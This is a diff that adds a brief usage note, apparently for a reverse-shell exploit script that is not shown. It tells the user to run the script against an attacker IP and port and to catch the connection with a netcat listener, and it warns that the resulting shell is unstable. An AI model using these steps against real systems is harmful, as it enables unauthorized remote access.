@@ -1,0 +1,9 @@
+# Note 
+
+## How use:
+1.- python3 <script> <attacker-ip> <attacker-port>
+2.- nc -lvnp <attacker-port>
+
+Just that XD
+
+Note: The Shell is unstable, so, jump to another from this one
